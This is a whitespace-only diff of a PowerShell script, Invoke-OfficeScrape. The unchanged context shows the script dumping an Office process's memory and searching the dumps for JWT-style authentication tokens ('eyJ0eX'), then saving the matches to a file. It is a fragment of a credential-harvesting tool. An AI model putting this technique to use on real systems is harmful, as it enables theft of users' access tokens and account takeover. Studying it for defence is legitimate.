@@ -22,7 +22,7 @@ Param (
 
     [Parameter(Mandatory=$false)]
     [Switch]$NumsOnly = $False,
-    
+
     [Parameter(Mandatory=$false)]
     [Switch]$Logging,
 
@@ -96,7 +96,7 @@ Param (
     http://www.exploit-monday.com/
 #>
 
-    
+
 
     BEGIN
     {
@@ -155,17 +155,17 @@ function Invoke-OfficeScrape {
         [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
         [String]
         $Proc,
-    
+
         [Parameter()]
         [String]
         $Outfile
-    
+
     )
     # Save Memory Dump to current directory
     $dest = $PWD
-    
+
     Write-Output "Starting Scraper"
-    
+
         $Procs = Get-Process $Proc -ErrorAction SilentlyContinue #| Select -Property Responding
         if ($Procs) {
             Write-Output "Target process is running. Dumping memory..."
@@ -175,7 +175,7 @@ function Invoke-OfficeScrape {
             $dumps = Get-ChildItem -Path $dest -Filter *.dmp | select FullName
             foreach ($d in $dumps) {
                 Write-Output "Scraping memory dump: $($d.FullName)"
-                $output = select-string -Path $d.FullName -Pattern eyJ0eX   
+                $output = select-string -Path $d.FullName -Pattern eyJ0eX
                 $output | out-file -append -encoding ascii $outfile
             }
         }
